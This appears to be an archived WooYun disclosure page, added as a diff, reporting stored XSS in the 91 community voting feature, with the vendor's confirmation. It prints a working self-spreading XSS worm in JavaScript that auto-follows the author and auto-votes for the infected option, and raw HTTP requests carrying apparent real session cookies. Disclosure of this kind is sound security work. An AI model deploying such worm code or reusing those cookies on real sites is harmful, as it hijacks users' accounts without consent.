@@ -1,0 +1,408 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		91社区存储型XSS和XSS Worm  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		91社区存储型XSS和XSS Worm  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/DragonEgg">DragonEgg</a> 
+</li><li>提交时间：		2013-02-03 23:51</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-02-03：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-02-04：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-02-14：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-02-24：	细节向普通白帽子公开<br/>
+									2013-03-06：	细节向实习白帽子公开<br/>
+									2013-03-20：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">91社区某处的XSS及其XSS Worm实现</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">91社区投票处存在XSS可导致XSS worm传播<br />
+<br />
+1：新建一个任意投票,然后添加选项，加入“XSS code”<br />
+<br />
+</p><p class="detail"><a href="../images/02223552faffefcd92fb1aa43ff2217def83405b.jpg" target="_blank"><img src="../images/02223552faffefcd92fb1aa43ff2217def83405b.jpg" alt=".jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+2：访问投票页面即可触发<br />
+<br />
+  </p><p class="detail"><a href="../images/022239474a2baaf62c9dc6fa5210919e003365a5.jpg" target="_blank"><img src="../images/022239474a2baaf62c9dc6fa5210919e003365a5.jpg" alt="QQ截图20130202223849.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+关于XSS Worm实现<br />
+<br />
+思路：<br />
+<br />
+自定义js文件<br />
+<br />
+目标的投票功能存在xss，可以修改投票选项进行xss<br />
+<br />
+一旦访问感染的js，就进行下面操作<br />
+<br />
+1:<br />
+<br />
+  自动参加恶意投票，选择被感染的选项投票（投票的选项会自己广播出去从而进行传播）post实现<br />
+<br />
+ <br />
+<br />
+</p><pre><code>*************************************投票start************************<br />
+POST /vote/dovote/vid/433 HTTP/1.1			//433是投票id <br />
+Host: t.91.com<br />
+Proxy-Connection: keep-alive<br />
+Content-Length: 6<br />
+Origin: http://t.91.com<br />
+X-Requested-With: XMLHttpRequest<br />
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1 LBBROWSER<br />
+Content-Type: application/x-www-form-urlencoded<br />
+Accept: application/json, text/javascript, */*; q=0.01<br />
+Referer: http://t.91.com/379610694                //379610694是用户自己的id<br />
+Accept-Encoding: gzip,deflate,sdch<br />
+Accept-Language: zh-CN,zh;q=0.8<br />
+Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3<br />
+Cookie: SUV=1359475045777963; __utma=1.513302903.1359475333.1359475333.1359475333.1; __utmz=1.1359475333.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); 0FF535D2-3733-4059-AA48-73EFB0DA00CE=376FC8AE-EA0A-4aa9-8CF8-BDCF086DAFE7=2013-01-30 00:13:04&amp;43CB770B-ECB7-4262-9F28-474C756FA85C=836a0471-1225-473b-a62e-015e3432776a&amp;77A7D26A-7211-4b2a-A04A-1A3F9959F179=465842840&amp;BF191744-3205-4d76-B8FC-3E0387F7EEFE=ee21862792cf8c9d397dccb7727c7c33; mininav=0; signedip=e39aeb1b8916c86f49ac0b542f23a163; PHPSESSID=b2974cfa13861b6803838a46dcdec208; NDUserCenterLogin=8D86E0CC-3E73-4d40-B849-55E6E63F9A08=379610694&amp;689CFFF9-7996-407d-A0DC-C834CE0B56A3=A84CB3710182FD72AC78692E174EE72E84E55E913EFF329F9600F8063BAAA2509B370B90C5B255FD348E9C38F87378FBCA440EEBE445BA32&amp;6ACA984D-8C96-4f45-9DE4-EABE9161375B=CC92F8E0BAFA8E09F26BF1D362EB02DDA85F0603FFF3820E95D8AA64F7D3356E&amp;C201DE9A-536B-428d-88E4-4F8665742D12=200&amp;89FDB445-D8D5-4d19-BC3A-D1EC2BFE68E1=20130131130528&amp;8E533C9E-481D-4288-89B2-71F96380C540=2013-01-31 14:05:28&amp;6E3A37BE-A0BD-4b9b-87A3-3323C3806ADD=84301d8b2526e82416aa4941b0f8babd; _TM_CN_SSO_CK=1359608730; uapc=dWlkPTM3OTYxMDY5NCZzaWQ9aGJ0bGc1Z2E4aXJob3I2aTR2MWlpbHV1azUmdGlkPSZiaWQ9JmV4cGlyZT0%3D; showtip_gamecard379610694=1; 60FC5FF9-8883-207a-B0DC-C834CE0B56A3=MjAwLTg0LTc%3D; ms_nums=0; comment_nickname=91%E7%94%A8%E6%88%B7%E7%9A%84%E5%95%8A; comment_user_nickname=91%E7%94%A8%E6%88%B7%E7%9A%84%E5%95%8A; comment_user_nickname_short=91%E7%94%A8%E6%88%B7%E7%9A%84%E5%95%8A; comment_user_id=379610694; comment_user_name=594yd; u_total_score=0; u_do_score=0; u_fight=0<br />
+<br />
+r=1415               //1415是选项id<br />
+*************************************投票end************************</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+2：<br />
+<br />
+   读取好友列表，向好友发送让他们参加投票的站内信（站内信传播）get获取列表，post发信<br />
+<br />
+<br />
+<br />
+</p><pre><code>***********************************好友读取*****************************<br />
+http://t.91.com/friend/ajaxfriendlist  //这是好友列表：会显示出好友的信息</code></pre><p class='detail'><br />
+<br />
+好友显示出来后会继续get各个好友的头像<br />
+<br />
+ </p><pre><code>/center/avatar.php?uid=379454311&amp;size=small&amp;type=real&amp;random=1359609442    //379454311就是好友id</code></pre><p class='detail'><br />
+<br />
+</p><pre><code>*************************************发信start************************<br />
+POST /pm/sendpm/379610694 HTTP/1.1         //379610694是接收人的id<br />
+Host: t.91.com<br />
+Proxy-Connection: keep-alive<br />
+Content-Length: 31<br />
+Origin: http://t.91.com<br />
+X-Requested-With: XMLHttpRequest<br />
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1 LBBROWSER<br />
+Content-Type: application/x-www-form-urlencoded<br />
+Accept: application/json, text/javascript, */*; q=0.01<br />
+Referer: http://t.91.com/pm/index/newpm/uid=379610694    //379610694是接收人的id<br />
+Accept-Encoding: gzip,deflate,sdch<br />
+Accept-Language: zh-CN,zh;q=0.8<br />
+Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3<br />
+Cookie: SUV=1359475045777963; __utma=1.513302903.1359475333.1359475333.1359475333.1; __utmz=1.1359475333.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); 0FF535D2-3733-4059-AA48-73EFB0DA00CE=376FC8AE-EA0A-4aa9-8CF8-BDCF086DAFE7=2013-01-30 00:13:04&amp;43CB770B-ECB7-4262-9F28-474C756FA85C=836a0471-1225-473b-a62e-015e3432776a&amp;77A7D26A-7211-4b2a-A04A-1A3F9959F179=465842840&amp;BF191744-3205-4d76-B8FC-3E0387F7EEFE=ee21862792cf8c9d397dccb7727c7c33; mininav=0; signedip=e39aeb1b8916c86f49ac0b542f23a163; PHPSESSID=b2974cfa13861b6803838a46dcdec208; NDUserCenterLogin=8D86E0CC-3E73-4d40-B849-55E6E63F9A08=379610694&amp;689CFFF9-7996-407d-A0DC-C834CE0B56A3=A84CB3710182FD72AC78692E174EE72E84E55E913EFF329F9600F8063BAAA2509B370B90C5B255FD348E9C38F87378FBCA440EEBE445BA32&amp;6ACA984D-8C96-4f45-9DE4-EABE9161375B=CC92F8E0BAFA8E09F26BF1D362EB02DDA85F0603FFF3820E95D8AA64F7D3356E&amp;C201DE9A-536B-428d-88E4-4F8665742D12=200&amp;89FDB445-D8D5-4d19-BC3A-D1EC2BFE68E1=20130131130528&amp;8E533C9E-481D-4288-89B2-71F96380C540=2013-01-31 14:05:28&amp;6E3A37BE-A0BD-4b9b-87A3-3323C3806ADD=84301d8b2526e82416aa4941b0f8babd; _TM_CN_SSO_CK=1359608730; uapc=dWlkPTM3OTYxMDY5NCZzaWQ9aGJ0bGc1Z2E4aXJob3I2aTR2MWlpbHV1azUmdGlkPSZiaWQ9JmV4cGlyZT0%3D; showtip_gamecard379610694=1; 60FC5FF9-8883-207a-B0DC-C834CE0B56A3=MjAwLTg0LTc%3D; ms_nums=0; comment_nickname=91%E7%94%A8%E6%88%B7%E7%9A%84%E5%95%8A; comment_user_nickname=91%E7%94%A8%E6%88%B7%E7%9A%84%E5%95%8A; comment_user_nickname_short=91%E7%94%A8%E6%88%B7%E7%9A%84%E5%95%8A; comment_user_id=379610694; comment_user_name=594yd; u_total_score=0; u_do_score=0; u_fight=0<br />
+<br />
+osubject=zhuti&amp;message=zhengwen            //主题和正文<br />
+*************************************发信end************************</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+3：<br />
+<br />
+	自动收听传播发起人，（统计感染数量） get方式<br />
+<br />
+</p><pre><code>get  /?controller=friend&amp;action=follow&amp;fid=379454312   //379454312被关注人的id</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+以上是一开始的思路，现学了1天多js脚本，然后尝试写了一天js后台提交数据，然后在今天下午发现自己NC了。。原因在下图：<br />
+<br />
+</p><p class="detail"><a href="../images/02225219d4e45a5049c1f36d9e399cd5db0b19da.jpg" target="_blank"><img src="../images/02225219d4e45a5049c1f36d9e399cd5db0b19da.jpg" alt="QQ截图20130202224950.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/022252291d7fe20087129d83d0c0937828e7e918.jpg" target="_blank"><img src="../images/022252291d7fe20087129d83d0c0937828e7e918.jpg" alt="QQ截图20130202225049.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+本来官方就有自己的函数，我擦擦擦擦。。然后找到函数所在的js文件<br />
+<br />
+</p><p class="detail"><a href="../images/0223004780e8be4f7367927f94f89eb39ce599b6.jpg" target="_blank"><img src="../images/0223004780e8be4f7367927f94f89eb39ce599b6.jpg" alt="QQ截图20130202225832.jpg" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/02230100a069c3f53f149c4344b2621a1de2e82c.jpg" target="_blank"><img src="../images/02230100a069c3f53f149c4344b2621a1de2e82c.jpg" alt="QQ截图20130202230022.jpg" width="600"/></a></p><p class="detail"> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">提取出相关代码，分析里面的函数功能实现方式：<br />
+<br />
+</p><pre><code>***********************************doVote()投票*****************************<br />
+**省略**<br />
+function doVote()<br />
+{<br />
+    var _ = art.T91_Waiting();<br />
+    $.ajax(<br />
+    {<br />
+        url : $GLOBALS[&quot;site_url&quot;] + &quot;vote/dovote/vid/&quot; + cur_vid, type : &quot;post&quot;, dataType : &quot;json&quot;, data : $(&quot;#voteform&quot;).serialize(),  //cur_vid是所发起的投票的id，data的值就是框架所选的，即想要投的选项<br />
+        success : function (A)<br />
+        {<br />
+            _.close();<br />
+            if (A.status == 1)<br />
+            {<br />
+                art.tips(&quot;succeed&quot;, A.html);    //成功返回消息<br />
+                LoadPageMainHtml(&quot;commoninfo&quot;, $(&quot;#copyurl&quot;).val() + ((typeof reqs_from != &quot;undefined&quot; &amp;&amp; reqs_from != 0) ? (&quot;/from/&quot; + reqs_from) : &quot;&quot;), <br />
+                true, true)<br />
+            }<br />
+            else {<br />
+                art.T91_TipsIcon(&quot;error&quot;, A.html);  //失败返回消息<br />
+            }<br />
+        }<br />
+    })<br />
+}<br />
+****省略*****<br />
+***********************************doVote()投票*****************************</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+发起的投票vid在状态栏可见，即想要投的选项的值在调试模式下可见<br />
+<br />
+</p><p class="detail"><a href="../images/02231132f418cb4252a0453223e925086b5d9e57.jpg" target="_blank"><img src="../images/02231132f418cb4252a0453223e925086b5d9e57.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/02231303c4744931b8b91e466b7d6982dcc925b4.jpg" target="_blank"><img src="../images/02231303c4744931b8b91e466b7d6982dcc925b4.jpg" alt="3.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+即data的值为“r=1482”<br />
+<br />
+</p><pre><code>***********************************doAddFollow(_)关注*****************************<br />
+****省略*****<br />
+function doAddFollow(_)<br />
+{<br />
+    $.ajax(<br />
+    {<br />
+        url : site_url + &quot;?controller=friend&amp;action=follow&quot;, type : &quot;get&quot;, dataType : &quot;json&quot;, data : &quot;fid=&quot; + _,    //变量“_”,没错，下划线是变量名，代表着要关注的人的UID，下面就是各种情况的返回消息。<br />
+        success : function (A)<br />
+        {<br />
+            if (A.state == 1)<br />
+            {<br />
+                var B = $(&quot;div[name=&#039;followconcern_&quot; + _ + &quot;&#039;]&quot;);<br />
+                if (B.length &gt; 0)<br />
+                {<br />
+                    if (A.follow == 1) <br />
+                    {<br />
+                        B.find(&quot;em[class=&#039;color_3&#039;]&quot;).html(&quot;\u5df2\u5173\u6ce8&quot;);<br />
+                        B.find(&quot;span[name=&#039;ico&#039;]&quot;).removeClass();<br />
+                        B.find(&quot;span[name=&#039;ico&#039;]&quot;).addClass(&quot;ico i_ygz&quot;);<br />
+                        B.find(&quot;span[class=&#039;col&#039;]&quot;).html(&quot; | &lt;a href=&#039;javascript:void(0);&#039; onclick=&#039;delFollow(&quot; + _ + &quot;);&#039; class=&#039;contact_cancel&#039;&gt;\u53d6\u6d88&lt;/a&gt;&quot;) <br />
+                    }<br />
+                    else if (A.follow == 2) <br />
+                    {<br />
+                        B.find(&quot;em[class=&#039;color_3&#039;]&quot;).html(&quot;\u76f8\u4e92\u5173\u6ce8&quot;);<br />
+                        B.find(&quot;span[name=&#039;ico&#039;]&quot;).removeClass();<br />
+                        B.find(&quot;span[name=&#039;ico&#039;]&quot;).addClass(&quot;ico i_hxgz&quot;);<br />
+                        B.find(&quot;span[class=&#039;col&#039;]&quot;).html(&quot; | &lt;a href=&#039;javascript:void(0);&#039; onclick=&#039;delFollow(&quot; + _ + &quot;);&#039; class=&#039;contact_cancel&#039;&gt;\u53d6\u6d88&lt;/a&gt;&quot;) <br />
+                    }<br />
+                    art.tips(&quot;succeed&quot;, A.msg);<br />
+                    delUsercard(&quot;id=&quot; + _);<br />
+                }<br />
+            }<br />
+            else if (A.state == 2) {<br />
+                art.tips(&quot;warning&quot;, A.msg);<br />
+            }<br />
+            else if (A.state == 3) {<br />
+                art.tips(&quot;warning&quot;, A.msg);<br />
+            }<br />
+            else {<br />
+                art.tips(&quot;error&quot;, A.msg);<br />
+            }<br />
+        }<br />
+    })<br />
+}<br />
+****省略*****<br />
+***********************************doAddFollow(_)关注*****************************</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+既然是worm，就肯定不要有各种的消息提示，所以精简官方的代码，只留下提交数据的，整合成咱们需要的js：<br />
+<br />
+</p><pre><code>*************************************成品worm************************<br />
+doAddFollow1(379454311);    //379454311自己的uid<br />
+window.setTimeout(&quot;doVote1();&quot;,1000);      //延时1s执行doVote1()，不然有时会类似丢包的效果出现<br />
+function doVote1()<br />
+{<br />
+    var _ = art.T91_Waiting();<br />
+    $.ajax(<br />
+    {<br />
+        url : $GLOBALS[&quot;site_url&quot;] + &quot;vote/dovote/vid/453&quot;, type : &quot;post&quot;, dataType : &quot;json&quot;, data : &quot;r=1482&quot;,    //453所发起的投票vid，1482所投票的id（即存在XSS代码的选项）<br />
+        success : function (A)<br />
+        {<br />
+            _.close();<br />
+            <br />
+        }<br />
+    })<br />
+}<br />
+<br />
+function doAddFollow1(_)<br />
+{<br />
+    $.ajax(<br />
+    {<br />
+        url : site_url + &quot;?controller=friend&amp;action=follow&quot;, type : &quot;get&quot;, dataType : &quot;json&quot;, data : &quot;fid=&quot; + _, <br />
+        success : function (A)<br />
+        {<br />
+            if (A.state == 1)<br />
+            {<br />
+                var B = $(&quot;div[name=&#039;followconcern_&quot; + _ + &quot;&#039;]&quot;);<br />
+                if (B.length &gt; 0)<br />
+                {<br />
+                    art.tips(&quot;succeed&quot;, A.msg);<br />
+                    delUsercard(&quot;id=&quot; + _);<br />
+                }<br />
+            }<br />
+        }<br />
+    })<br />
+}<br />
+*************************************成品worm************************</code></pre><p class='detail'><br />
+<br />
+ps：刚学js，再加上最近要努力学单片机鸟，第二项功能就没继续研究下去了，可以按照投票的js代码修改一下。大家多多包涵。。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">漏洞证明：<br />
+<br />
+http://t.91.com/vote/view/vid/452/from/full<br />
+<br />
+</p><p class="detail"><a href="../images/02233430ac62890f414695005b7542d9aa93f625.jpg" target="_blank"><img src="../images/02233430ac62890f414695005b7542d9aa93f625.jpg" alt="QQ截图20130202233349.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+修复方式你懂得，，另外求礼物啊求礼物，还有三个漏洞呦。其中1.5个也能执行xss worm，从来没有过礼物呢，求礼物啊求礼物。。O(∩_∩)O~~ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/DragonEgg" title="DragonEgg">DragonEgg</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-018298" title="91社区存储型XSS和XSS Worm">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2013-02-04 11:05</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢DragonEgg提交的漏洞，此处漏洞先前已有类似问题提交过，已安排在修复</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="18298";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
